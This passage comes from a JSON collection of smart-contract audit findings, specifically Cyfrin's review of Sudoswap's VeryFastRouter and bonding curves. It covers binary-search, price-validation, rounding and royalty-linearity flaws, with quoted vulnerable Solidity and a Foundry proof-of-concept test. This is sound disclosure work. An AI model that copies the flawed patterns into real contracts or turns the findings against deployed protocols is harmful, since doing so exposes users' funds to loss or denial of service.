arithmetic error.\n\n**Sudoswap:**\nAcknowledged, the risk is acceptable as it leads to reverts, but cannot affect users funds.\nIn the case of owners adjusting price prior to a swap, the intent is for users to use the minOutput/maxInput amounts to protect themselves from excessive slippage.\n\n**Cyfrin:**\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-01-Sudoswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Alex Roan",
        "0kage",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "18417",
      "title": "Binary search implementation may not always find the optimal solution",
      "impact": "MEDIUM",
      "content": "**Description:**\n`VeryFastRouter::_findMaxFillableAmtForBuy` and `VeryFastRouter::_findMaxFillableAmtForSell` utilize binary search to determine the maximum trade amount. The binary search seeks a solution in a linear, sorted space based on a test function (a criteria function used to decide the next search area). However, the current implementation is unlikely to guarantee this and might either fail to find a solution or identify a suboptimal one.\n\nFirst, `VeryFastRouter::_findMaxFillableAmtForSell` attempts to find a solution in an array `[1, …, minOutputPerNumNFTs.length]` and the test boolean function used is\n`error != CurveErrorCodes.Error.OK || currentOutput < minOutputPerNumNFTs[(start + end) / 2 - 1] || currentOutput > pairTokenBalance`, where `currentOutput` is the number of tokens that the user will receive for the trade of `(start+end)/2-1` items.\nIf we represent the test criteria as `f(x)`, where `x` is the number of items to trade, and treat `true` as `1` and `false` as `0`, then `f([1, …, minOutputPerNumNFTs.length])` should be like `[1, 1, .... 1, 0, ..., 0]` and the binary search should locate the final `1`.\nTo achieve this, each condition in the test function should produce outputs like `[1, 1, .... 1, 0, ..., 0]`; otherwise, the binary search may fail to find a solution or a suboptimal one.\nHowever, `GDACurve` does not satisfy the condition `error != CurveErrorCodes.Error.OK`. As `x` (`numItems`) increases, `alphaPowN` increases, and `newSpotPrice_` decreases. Therefore, it will return `ERROR.SPOT_PRICE_OVERFLOW` for `x` less than a specific threshold and `ERROR.OK` for `x` greater than or equal to the threshold. As a result, the output of this condition will be like `[0, 0, .... 0, 1, ..., 1]` and not `[1, 1, .... 1, 0, ..., 0]`.\n\nNext, in `VeryFastRouter::_findMaxFillableAmtForBuy`, the core criteria function for binary search is that the cost of buying `i` NFT's (let's call it `C[i]`) should be less than or equal to the max bid price placed by a user for purchasing `i` NFTs (`(i-1)-`th element in the `maxCostPerNumNFTs` array, `maxCostPerNumNFTs[i-1]`). The implicit assumption here is that, if `C[i] > maxCostPerNumNFTs[i-1]`, then `C[j] > maxCostPerNumNFTs[j-1]` for all `j > i`.\nThis implies that if the cost of purchasing `i` NFTs from the pool surpasses the maximum bid a user has placed for acquiring `i` NFTs, the purchase cost should persistently exceed the maximum bid even when attempting to buy a larger number of NFTs. This condition may not always hold true. For instance, if a user is solely interested in purchasing a larger collection of NFTs from a pool, they might place lower bids for buying a smaller quantity of items and more aggressive bids for acquiring a greater number of items in the pool.\n\n**Proof of Concept:**\nConsider a situation with the following conditions:\n\n1. A pool containing a collection of 11 NFTs with an Exponential Bonding Curve (Spot Price: 1 eth, Delta: 1.05).\n2. Alice computes the maximum bids for buying a collection of NFTs using `VeryFastRouter::getNFTQuoteForBuyOrderWithPartialFill`.\n3. Alice desires to acquire a majority of the NFTs in the pool but is not interested in purchasing if she only obtains a smaller portion of the NFTs. To achieve these goals, she adjusts her max bid array as follows.\n4. Alice reduces the max bid (calculated in step 2) for purchasing up to the first 50% of the total items in the pool by 25%.\n5. Alice increases the max bid (calculated in step 2) for purchasing more than 50% of the total items in the pool by 10%.\n\nDespite Alice's bid being sufficient to buy the entire collection, her order is only partially filled, and she receives a mere 5 NFTs out of the total 11.\n\nThe code snippet below replicates this scenario:\n```\n    function testSwapBinarySearch_audit() public{\n        //START_INDEX=0, END_INDEX=10\n        uint256[] memory nftIds;\n        LSSVMPair pair;\n        uint256 numNFTsForQuote = END_INDEX + 1;\n\n        //1. create an array of nft ids\n        nftIds = _getArray(START_INDEX, END_INDEX);\n        assertEq(nftIds.length, END_INDEX - START_INDEX + 1);\n\n        //2. setup a ERC721 ETH pair with property checker is zero address and zero deposit amount\n        pair = setUpPairERC721ForSale(0, address(0), nftIds);\n\n        //3. get the inputAmount needed to buy all NFTs in the pool\n        (,,,uint256 inputAmount,,) = pair.getBuyNFTQuote(0, numNFTsForQuote);\n\n        //4. get partialFillAmounts\n        uint256[] memory partialFillAmounts = router.getNFTQuoteForBuyOrderWithPartialFill(pair, numNFTsForQuote, 0, 0);\n\n        console.log(\"*********Max cost generated by getNFTQuoteForBuyOrderWithPartialFill**********\");\n        for(uint256 i; i< END_INDEX-START_INDEX + 1; i++){\n            console.log(\"Max Cost (default) to buy %i items, %i\", i+1, partialFillAmounts[i]);\n        }\n\n        // with no slippage, inputAmount should exactly be equal to the last partialFillAmount\n        assertEq(inputAmount, partialFillAmounts[END_INDEX-START_INDEX]);\n\n\n        uint256 midIndex = (END_INDEX - START_INDEX + 1 ) / 2;\n        console.log(\"**********Max cost custom created by a user**********\");\n         for(uint256 j; j< END_INDEX-START_INDEX + 1; j++){\n            if(j <= midIndex){\n                    partialFillAmounts[j] -= partialFillAmounts[j] * 25 / 100; //@audit reduce max bid by 25%\n            }\n            else{\n                   partialFillAmounts[j] += partialFillAmounts[j] * 10 / 100; //@audit increase max bid by 10%\n            }\n            console.log(\"Max Cost (custom) to buy %i items, %i\", j+1, partialFillAmounts[j]);\n        }\n        //6 creating a single buy order for the pair\n        VeryFastRouter.BuyOrderWithPartialFill memory buyOrder = VeryFastRouter.BuyOrderWithPartialFill({\n            pair: pair,\n            nftIds: nftIds,\n            maxInputAmount: inputAmount,\n            ethAmount: inputAmount,\n            expectedSpotPrice: pair.spotPrice() + 1, //getPairBaseQuoteTokenBalancetriggers partial fill logic\n            isERC721: true,\n            maxCostPerNumNFTs: partialFillAmounts\n        });\n\n        VeryFastRouter.BuyOrderWithPartialFill[] memory buyOrders =\n            new VeryFastRouter.BuyOrderWithPartialFill[](1); //adding a single buy order\n        VeryFastRouter.SellOrderWithPartialFill[] memory sellOrders; //no sell orders, just a 0 length array\n\n        buyOrders[0] = buyOrder;\n\n        //check that nft recipient before swap does not have any nfts\n        assertEq(IERC721(pair.nft()).balanceOf(NFT_RECIPIENT),0);\n\n        //-n check that pair holds all the nfts that are part of the buy order\n        assertEq(IERC721(pair.nft()).balanceOf(address(pair)), END_INDEX - START_INDEX + 1);\n\n        VeryFastRouter.Order memory swapOrder = VeryFastRouter.Order({\n            buyOrders: buyOrders,\n            sellOrders: sellOrders, //-n no sell orders for this case\n            tokenRecipient: payable(address(TOKEN_RECIPIENT)),\n            nftRecipient: NFT_RECIPIENT,\n            recycleETH: false\n        });\n\n        // Prank as the router caller and do the swap\n        vm.startPrank(ROUTER_CALLER);\n        address tokenAddress = getTokenAddress();\n\n        // Set up approval for token if it is a token pair (for router caller)\n        if (tokenAddress != address(0)) {\n            ERC20(tokenAddress).approve(address(router), 1e18 ether); //-n give approval for very high amount\n            IMintable(tokenAddress).mint(ROUTER_CALLER, 1e18 ether); //-n mint 1e18 ether\n        }\n\n        // // Store the swap results\n        uint256[] memory swapResults = router.swap{value: inputAmount}(swapOrder);\n        vm.stopPrank();\n\n        //-n should only have one order\n        assertEq(swapResults.length, buyOrders.length);\n\n        console.log(\"Total NFTs in the pair\", IERC721(pair.nft()).balanceOf(address(pair)));\n        console.log(\"Total NFTs received by nft recipient\", IERC721(pair.nft()).balanceOf(NFT_RECIPIENT));\n\n        assertEq(IERC721(pair.nft()).balanceOf(NFT_RECIPIENT), midIndex);\n\n    }\n```\n\nOutput:\n\n```solidity\n  *********Max cost generated by getNFTQuoteForBuyOrderWithPartialFill**********\n  Max Cost (default) to buy 1 items, 1710339358116313477\n  Max Cost (default) to buy 2 items, 3339233984893754885\n  Max Cost (default) to buy 3 items, 4890562200872270508\n  Max Cost (default) to buy 4 items, 6368017644661333008\n  Max Cost (default) to buy 5 items, 7775118067317583008\n  Max Cost (default) to buy 6 items, 9115213707942583008\n  Max Cost (default) to buy 7 items, 10391495270442583008\n  Max Cost (default) to buy 8 items, 11607001520442583008\n  Max Cost (default) to buy 9 items, 12764626520442583008\n  Max Cost (default) to buy 10 items, 13867126520442583003\n  Max Cost (default) to buy 11 items, 14917126520442583017\n  **********Max cost custom created by a user**********\n  Max Cost (custom) to buy 1 items, 1282754518587235108\n  Max Cost (custom) to buy 2 items, 2504425488670316164\n  Max Cost (custom) to buy 3 items, 3667921650654202881\n  Max Cost (custom) to buy 4 items, 4776013233495999756\n  Max Cost (custom) to buy 5 items, 5831338550488187256\n  Max Cost (custom) to buy 6 items, 6836410280956937256\n  Max Cost (custom) to buy 7 items, 11430644797486841308\n  Max Cost (custom) to buy 8 items, 12767701672486841308\n  Max Cost (custom) to buy 9 items, 14041089172486841308\n  Max Cost (custom) to buy 10 items, 15253839172486841303\n  Max Cost (custom) to buy 11 items, 16408839172486841318\n  Total NFTs in the pair 6\n  Total NFTs received by nft recipient 5\n```\n\nDespite the maximum bid for acquiring all 11 items being significantly higher than the true cost of the 11 items, the final outcome reveals that the user only obtains 5 items. Therefore, while users submit bids to purchase a larger quantity of NFTs, the existing implementation carries out a partial order and sells fewer NFTs to the user.\n\n**Impact:**\nThis issue does not result in an immediate financial loss. Nevertheless, users acquire fewer NFTs than they originally planned to buy. Given the significance of the core logic, the impact of this issue is considered to be MEDIUM.\n\n**Recommendation:**\nWhile we acknowledge that using a brute-force approach as an alternative to binary search could consume a significant amount of gas, we suggest conducting a comprehensive examination of possible edge cases (across all curve implementations) to guarantee that the binary search yields the best solution for any reasonable user inputs.\n\n**Sudoswap:**\nAcknowledged.\n\n**Cyfrin:**\nAcknowledged.",
      "summary": "\nThe bug report discusses an issue with the binary search algorithm used in the `VeryFastRouter::_findMaxFillableAmtForBuy` and `VeryFastRouter::_findMaxFillableAmtForSell` functions. The binary search seeks a solution in a linear, sorted space based on a test function. However, the current implementation is unlikely to guarantee this and might either fail to find a solution or identify a suboptimal one.\n\nIn the case of `VeryFastRouter::_findMaxFillableAmtForBuy`, the core criteria function for binary search is that the cost of buying `i` NFT's (let's call it `C[i]`) should be less than or equal to the max bid price placed by a user for purchasing `i` NFTs (`(i-1)-`th element in the `maxCostPerNumNFTs` array, `maxCostPerNumNFTs[i-1]`). The implicit assumption here is that, if `C[i] > maxCostPerNumNFTs[i-1]`, then `C[j] > maxCostPerNumNFTs[j-1]` for all `j > i`. This condition may not always hold true.\n\nTo demonstrate this, a proof of concept was provided. It showed that a user could adjust their max bid array, reducing the max bid for purchasing up to the first 50% of the total items in the pool by 25%, and increasing the max bid for purchasing more than 50% of the total items in the pool by 10%. Despite the bid being sufficient to buy the entire collection, the order was only partially filled, and the user received a mere 5 NFTs out of the total 11.\n\nThe impact of this issue is considered to be MEDIUM as it does not result in an immediate financial loss but users acquire fewer NFTs than they originally planned to buy. The recommendation is to conduct a comprehensive examination of possible edge cases (across all curve implementations) to guarantee that the binary search yields the best solution for any reasonable user inputs.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-01-Sudoswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Alex Roan",
        "0kage",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "18416",
      "title": "GDACurve does not validate new spot price",
      "impact": "MEDIUM",
      "content": "**Description:**\nThe new spot price calculated in `GDACurve::getBuyInfo` and `GDACurve::getSellInfo` is not currently validated against `MIN_PRICE`, meaning that the price could fall below this value.\n\n```solidity\nGDACurve.sol (Line 81-91)\n\n        // The new spot price is multiplied by alpha^n and divided by the time decay so future\n        // calculations do not need to track number of items sold or the initial time/price. This new spot price\n        // implicitly stores the initial price, total items sold so far, and time elapsed since the start.\n        {\n            UD60x18 newSpotPrice_ = spotPrice_.mul(alphaPowN);\n            newSpotPrice_ = newSpotPrice_.div(decayFactor);\n            if (newSpotPrice_.gt(ud(type(uint128).max))) {\n                return (Error.SPOT_PRICE_OVERFLOW, 0, 0, 0, 0, 0);\n            } //@audit-info Missing minimum price check\n            newSpotPrice = uint128(unwrap(newSpotPrice_));\n        }\n```\n\nWhile a minimum price check is performed explicitly in `GDACurve::validateSpotPrice`, the same validation is missing when the price gets updated.\n\n```solidity\nGDACurve.sol (Line 34-36)\n\n    function validateSpotPrice(uint128 newSpotPrice) external pure override returns (bool) {\n        return newSpotPrice >= MIN_PRICE;\n    }\n```\n\nSince the maximum value of the decay factor is capped at a significantly large value (2^20), in scenarios with high `lambda`, low initial price, and low demand (i.e. extended time intervals between successive purchases), there is a likelihood that spot price can drop below `MIN_PRICE` level (currently set to a constant value, `1 gwei`).\n\n**Impact**\nIn most cases, dutch auctions tend to quickly find buyers long before prices hit the `MIN_PRICE` levels. Also, since the GDA bonding curve is only meant to be used for single-sided pools, there does not appear to be an immediate risk of pools trading large volumes at extremely low prices.\nHowever, not having a reserve price could mean market-making for some pools can happen at extremely low prices in perpetuity.\n\n**Recommended Mitigation:**\nAs with an exponential bonding curve, we recommend introducing minimum price validation in `GDACurve::getBuyInfo` and `GDACurve::getSellInfo` when the spot price is updated.\n\n**Sudoswap:**\nFixed in [commit c4dc61](https://github.com/sudoswap/lssvm2/commit/c4dc6159b8e3a3252f82ef4afea1f62417994425).\n\n**Cyfrin:**\nVerified.",
      "summary": "\nThis bug report is about the new spot price calculated in `GDACurve::getBuyInfo` and `GDACurve::getSellInfo` not being validated against `MIN_PRICE` (currently set to a constant value, `1 gwei`). This means that the spot price could fall below this value in certain scenarios with high `lambda`, low initial price, and low demand. \n\nThe impact of this bug is that market-making for some pools can happen at extremely low prices in perpetuity. To mitigate this, a minimum price validation should be introduced in `GDACurve::getBuyInfo` and `GDACurve::getSellInfo` when the spot price is updated. This was fixed in the commit c4dc61 and verified.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-01-Sudoswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Alex Roan",
        "0kage",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "18415",
      "title": "Different rounding directions are recommended for getting buy/sell info",
      "impact": "MEDIUM",
      "content": "**Description:**\nThis issue pertains to the need for more implementation of different rounding directions for buy and sell operations in the AMM pools.\nIn several `ICurve` implementations (`XykCurve`, `GDACurve`), the `ICurve::getBuyInfo` and `ICurve::getSellInfo` functions are implemented using the same rounding direction.\nThis does not align with the best practices for AMM pools, which dictate that different rounding directions should be applied for buy and sell operations to prevent potential issues. The problem becomes more significant for tokens with fewer decimals, resulting in larger pricing discrepancies.\n\nNote that `ExponentialCurve` explicitly uses different rounding directions for buy and sell operations, which aligns with the best practices.\n\nAdditionally, across all curves, calculations of the protocol and trade fees currently do not round in favor of the protocol and fee recipients, which means that value may leak from the system in favor of the traders.\n\n**Impact:**\nThe issue may result in financial loss for pair creators and negatively impact the platform's overall stability, especially for tokens with fewer decimals. We, therefore, rate the severity as MEDIUM.\n\n**Recommended Mitigation:**\nEnsure that the buy price and protocol/trade fees are rounded up to prevent selling items at a lower price than desired and leaking value from the system.\n\n**Sudoswap:**\nFixed in [commit 902eee](https://github.com/sudoswap/lssvm2/commit/902eee37890af3953a55472d885bf6265b329434).\n\n**Cyfrin:**\nVerified.",
      "summary": "\nThis bug report is about the need for more implementation of different rounding directions for buy and sell operations in the AMM pools. In several `ICurve` implementations, the same rounding direction was applied for buy and sell operations, which does not align with the best practices for AMM pools. This may lead to financial loss for pair creators and negatively impact the platform's overall stability, especially for tokens with fewer decimals.\n\nThe recommended mitigation for this issue is to ensure that the buy price and protocol/trade fees are rounded up to prevent selling items at a lower price than desired and leaking value from the system. This issue has been fixed in the commit 902eee on the Sudoswap GitHub repository and has been verified by Cyfrin.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-01-Sudoswap.md",
      "github_link": "",
      "tags": [
        "Rounding"
      ],
      "finders": [
        "Hans",
        "Alex Roan",
        "0kage",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "18414",
      "title": "Possible reverts due to using stricter requirements in inner swap",
      "impact": "MEDIUM",
      "content": "**Description:**\n`VeryFastRouter::swap` relies on the internal functions `VeryFastRouter::_findMaxFillableAmtForSell` and `VeryFastRouter::_findMaxFillableAmtForBuy` to find the maximum possible amount of tokens to be swapped.\nThe output is supposed to be the _actual_ cost of the swap, and it is used as the [`minExpectedTokenOutput`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/erc721/LSSVMPairERC721.sol#L92) parameter for selling logic and the [`maxExpectedTokenInput`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/erc721/LSSVMPairERC721.sol#L32) parameter for buying logic; however, this is problematic and can lead to protocol unintended protocol behavior because the actual cost of the swap can differ from the output of these functions. We pointed out the issue with linearity assumptions in another finding, but we are raising this separately because the actual pair's swap function is being called with stricter requirements.\n\n```solidity\nVeryFastRouter.sol\n326:                 uint256 numItemsToFill;\n327:                 uint256 priceToFillAt;\n328:\n329:                 {\n330:                     // Grab royalty for calc in _findMaxFillableAmtForSell\n331:                     (,, uint256 royaltyAmount) = order.pair.calculateRoyaltiesView(\n332:                         order.isERC721 ? order.nftIds[0] : LSSVMPairERC1155(address(order.pair)).nftId(), BASE\n333:                     );\n334:\n335:                     // Calculate the max number of items we can sell\n336:                     (numItemsToFill, priceToFillAt) = _findMaxFillableAmtForSell(//@audit-info priceToFillAt >= order.minExpectedOutputPerNumNFTs\n337:                         order.pair,\n338:                         pairSpotPrice,\n339:                         order.minExpectedOutputPerNumNFTs,\n340:                         protocolFeeMultiplier,\n341:                         royaltyAmount\n342:                     );\n343:                 }\n344:\n345:                 // If we can sell at least 1 item...\n346:                 if (numItemsToFill != 0) {\n347:                     // If property checking is needed, do the property check swap\n348:                     if (order.doPropertyCheck) {\n349:                         outputAmount = ILSSVMPairERC721(address(order.pair)).swapNFTsForToken(\n350:                             order.nftIds[:numItemsToFill],\n351:                             priceToFillAt,//@audit-info min expected output, different from the one specified by the user\n352:                             swapOrder.tokenRecipient,\n353:                             true,\n354:                             msg.sender,\n355:                             order.propertyCheckParams\n356:                         );\n357:                     }\n358:                     // Otherwise do a normal sell swap\n359:                     else {\n360:                         // Get subarray if ERC721\n361:                         if (order.isERC721) {\n362:                             outputAmount = order.pair.swapNFTsForToken(\n363:                                 order.nftIds[:numItemsToFill], priceToFillAt, swapOrder.tokenRecipient, true, msg.sender//@audit-info min expected output, different from the one specified by the user\n364:                             );\n365:                         }\n366:                         // For 1155 swaps, wrap as number\n367:                         else {\n368:                             outputAmount = order.pair.swapNFTsForToken(\n369:                                 _wrapUintAsArray(numItemsToFill),\n370:                                 priceToFillAt,\n371:                                 swapOrder.tokenRecipient,\n372:                                 true,\n373:                                 msg.sender\n374:                             );\n375:                         }\n376:                     }\n377:                 }\n\n```\n\nIf the actual sale of the swap is lower than the output of `VeryFastRouter::_findMaxFillableAmtForSell` and `VeryFastRouter::_findMaxFillableAmtForBuy`, the swap will fail, but it could have passed if the original `minExpectedOutputPerNumNFTs` and `maxCostPerNumNFTs` were used instead.\nIf it can be guaranteed that the output of `VeryFastRouter::_findMaxFillableAmtForSell` and `VeryFastRouter::_findMaxFillableAmtForBuy` will always represent the exact sale/cost, this may be fine, but it is not clear why the original `minExpectedOutputPerNumNFTs` and `maxCostPerNumNFTs` are not used.\n\n**Impact:**\nAlthough this does not lead to direct loss of funds, we are evaluating the severity of MEDIUM because it can lead to unintended protocol behavior.\n\n**Recommended Mitigation:**\nWe recommend using `minExpectedOutputPerNumNFTs` and `maxCostPerNumNFTs` instead of the output of `VeryFastRouter::_findMaxFillableAmtForSell` and `VeryFastRouter::_findMaxFillableAmtForBuy` as arguments to the actual swap functions.\n\n**Sudoswap:**\nAcknowledged. Given that the input values are expected to be returned from the Bonding Curve, this is likely to be an extremely rare occurance.\n\n**Cyfrin:**\nAcknowledged.",
      "summary": "\nThis bug report is about the `VeryFastRouter::swap` function in the `VeryFastRouter.sol` file. This function relies on the internal functions `VeryFastRouter::_findMaxFillableAmtForSell` and `VeryFastRouter::_findMaxFillableAmtForBuy` to find the maximum possible amount of tokens to be swapped. The output of these functions is then used as the `minExpectedTokenOutput` and `maxExpectedTokenInput` parameters for selling and buying logic, respectively.\n\nThe problem is that the actual cost of the swap can differ from the output of these functions, which can lead to unintended protocol behavior. If the actual sale of the swap is lower than the output of these functions, the swap will fail, but it could have passed if the original `minExpectedOutputPerNumNFTs` and `maxCostPerNumNFTs` were used instead.\n\nThe impact of this bug is evaluated as MEDIUM because it can lead to unintended protocol behavior, although it does not lead to direct loss of funds. The recommended mitigation is to use `minExpectedOutputPerNumNFTs` and `maxCostPerNumNFTs` instead of the output of `VeryFastRouter::_findMaxFillableAmtForSell` and `VeryFastRouter::_findMaxFillableAmtForBuy` as arguments to the actual swap functions. This has been acknowledged by Sudoswap and Cyfrin.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-01-Sudoswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Alex Roan",
        "0kage",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "18413",
      "title": "Linearity assumption on the royalty can lead to denial of service",
      "impact": "HIGH",
      "content": "**Description:**\n`VeryFastRouter::swap` relies on the internal functions [`VeryFastRouter::_findMaxFillableAmtForSell`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/VeryFastRouter.sol#L556) and [`VeryFastRouter::_findMaxFillableAmtForBuy`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/VeryFastRouter.sol#L503) to find the maximum possible amount of tokens to be swapped via binary search as below:\n\n```solidity\nVeryFastRouter.sol\n576:         // Perform binary search\n577:         while (start <= end) {\n578:             // We check the price to sell index + 1\n579:             (\n580:                 CurveErrorCodes.Error error,\n581:                 /* newSpotPrice */\n582:                 ,\n583:                 /* newDelta */\n584:                 ,\n585:                 uint256 currentOutput,\n586:                 /* tradeFee */\n587:                 ,\n588:                 /* protocolFee */\n589:             ) = pair.bondingCurve().getSellInfo(\n590:                 spotPrice,\n591:                 // get delta from deltaAndFeeMultiplier\n592:                 uint128(deltaAndFeeMultiplier >> 96),\n593:                 (start + end) / 2,\n594:                 // get feeMultiplier from deltaAndFeeMultiplier\n595:                 uint96(deltaAndFeeMultiplier),\n596:                 protocolFeeMultiplier\n597:             );\n598:             currentOutput -= currentOutput * royaltyAmount / BASE;//@audit-info assumes royalty amount is linear\n599:             // If the bonding curve has a math error, or\n600:             // if the current output is too low relative to our max output, or\n601:             // if the current output is greater than the pair's token balance,\n602:             // then we recurse on the left half (i.e. less items)\n603:             if (\n604:                 error != CurveErrorCodes.Error.OK || currentOutput < minOutputPerNumNFTs[(start + end) / 2 - 1] /* this is the max cost we are willing to pay, zero-indexed */\n605:                     || currentOutput > pairTokenBalance\n606:             ) {\n607:                 end = (start + end) / 2 - 1;\n608:             }\n609:             // Otherwise, we recurse on the right half (i.e. more items)\n610:             else {\n611:                 numItemsToFill = (start + end) / 2;\n612:                 start = (start + end) / 2 + 1;\n613:                 priceToFillAt = currentOutput;\n614:             }\n615:         }\n```\nThe protocol is designed to integrate various royalty info providers. Line 598 assumes the royalty amount is linear; however, this assumption can be violated, especially in the case of external royalty info providers who could be malicious and return a non-linear royalty amount.\nFor example, the royalty amount can be a function of the number of tokens to be swapped (e.g. greater/fewer royalties for a larger/smaller sale amount).\nIn this case, line 598 will be violated, and the max fillable functions will return incorrect `priceToFillAt` and `numItemsToFill`.\n\nFor example, `KODAV2` royalty calculation is NOT accurately linear to the input amount due to roundings.\n\n```solidity\n    function getKODAV2RoyaltyInfo(address _tokenAddress, uint256 _id, uint256 _amount)\n        external\n        view\n        override\n        returns (address payable[] memory receivers, uint256[] memory amounts)\n    {\n        // Get the edition the token is part of\n        uint256 _editionNumber = IKODAV2(_tokenAddress).editionOfTokenId(_id);\n        require(_editionNumber > 0, \"Edition not found for token ID\");\n\n        // Get existing artist commission\n        (address artistAccount, uint256 artistCommissionRate) = IKODAV2(_tokenAddress).artistCommission(_editionNumber);\n\n        // work out the expected royalty payment\n        uint256 totalRoyaltyToPay = (_amount / modulo) * creatorRoyaltiesFee;\n\n        // Get optional commission set against the edition and work out the expected commission\n        (uint256 optionalCommissionRate, address optionalCommissionRecipient) =\n            IKODAV2(_tokenAddress).editionOptionalCommission(_editionNumber);\n        if (optionalCommissionRate > 0) {\n            receivers = new address payable[](2);\n            amounts = new uint256[](2);\n\n            uint256 totalCommission = artistCommissionRate + optionalCommissionRate;\n\n            // Add the artist and commission\n            receivers[0] = payable(artistAccount);\n            amounts[0] = (totalRoyaltyToPay / totalCommission) * artistCommissionRate;//@audit-info rounding occurs here\n\n            // Add optional splits\n            receivers[1] = payable(optionalCommissionRecipient);\n            amounts[1] = (totalRoyaltyToPay / totalCommission) * optionalCommissionRate;//@audit-info rounding occurs here\n        } else {\n            receivers = new address payable[](1);\n            amounts = new uint256[](1);\n\n            // Add the artist and commission\n            receivers[0] = payable(artistAccount);\n            amounts[0] = totalRoyaltyToPay;\n        }\n\n        return (receivers, amounts);\n    }\n```\n\nIf the royalty info provider returned higher royalty for a larger sale amount, the `priceToFillAt` will be higher than the actual sale.\nNote that the `priceToFillAt` value calculated with the linearity assumption is used as a [minimum expected output parameter](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/VeryFastRouter.sol#L351) for the function `ILSSVMPairERC721::swapNFTsForToken` within the swap sell logic. Similar reasoning holds for the swap-buy logic.\n\n```solidity\nVeryFastRouter.sol\n345:                 // If we can sell at least 1 item...\n346:                 if (numItemsToFill != 0) {\n347:                     // If property checking is needed, do the property check swap\n348:                     if (order.doPropertyCheck) {\n349:                         outputAmount = ILSSVMPairERC721(address(order.pair)).swapNFTsForToken(\n350:                             order.nftIds[:numItemsToFill],\n351:                             priceToFillAt,//@audit-info min expected output\n352:                             swapOrder.tokenRecipient,\n353:                             true,\n354:                             msg.sender,\n355:                             order.propertyCheckParams\n356:                         );\n357:                     }\n358:                     // Otherwise do a normal sell swap\n359:                     else {\n360:                         // Get subarray if ERC721\n361:                         if (order.isERC721) {\n362:                             outputAmount = order.pair.swapNFTsForToken(\n363:                                 order.nftIds[:numItemsToFill], priceToFillAt, swapOrder.tokenRecipient, true, msg.sender\n364:                             );\n365:                         }\n366:                         // For 1155 swaps, wrap as number\n367:                         else {\n368:                             outputAmount = order.pair.swapNFTsForToken(\n369:                                 _wrapUintAsArray(numItemsToFill),\n370:                                 priceToFillAt,\n371:                                 swapOrder.tokenRecipient,\n372:                                 true,\n373:                                 msg.sender\n374:                             );\n375:                         }\n376:                     }\n377:                 }\n```\nThus, the swap will fail if the `priceToFillAt` is calculated to be greater than the actual sale.\n\nThe Cyfrin team acknowledges that Sudoswap expects all collections to be ERC-2981 compliant, and EIP-2981 states that the royalty amount should be linear to the amount.\nHowever, tokens can use a royalty lookup that is not compliant with EIP-2981 and can be abused to prevent honest users' valid transactions, so the protocol should not rely on the assumption that the royalty amount is linear.\n\n**Impact:**\nThe linearity assumption can be violated, especially in the case of external royalty info providers (possibly malicious), and this can lead to protocol failing to behave as expected, as legitimate swaps will fail.\nDue to these incorrect assumptions affecting the core functions, we evaluate the severity to HIGH.\n\n**Recommended Mitigation:**\nWhile we understand the protocol team intended to reduce gas costs by using the linearity assumption, we recommend using the actual royalty amount to calculate `priceToFillAt` and `numItemsToFill`.\n\n**Sudoswap:**\nAcknowledged. It is expected that the majority of NFTs will be ERC-2981 compliant.\n\n**Cyfrin:**\nAcknowledged.",
      "summary": "\nThis bug report is about the `VeryFastRouter::swap` function in the Sudoswap protocol, which relies on two internal functions to find the maximum possible amount of tokens to be swapped via binary search. The protocol is designed to integrate various royalty info providers, which can be malicious and return a non-linear royalty amount. This can lead to the max fillable functions returning incorrect `priceToFillAt` and `numItemsToFill` values, which can cause legitimate swaps to fail. The bug is considered to be high severity.\n\nThe recommended mitigation for this bug is to use the actual royalty amount to calculate `priceToFillAt` and `numItemsToFill`, rather than relying on the assumption that the royalty amount is linear. Both Sudoswap and Cyfrin have acknowledged this bug.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-01-Sudoswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Alex Roan",
        "0kage",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "18412",
      "title": "Malicious pair can re-enter `VeryFastRouter` to drain original caller's funds",
      "impact": "HIGH",
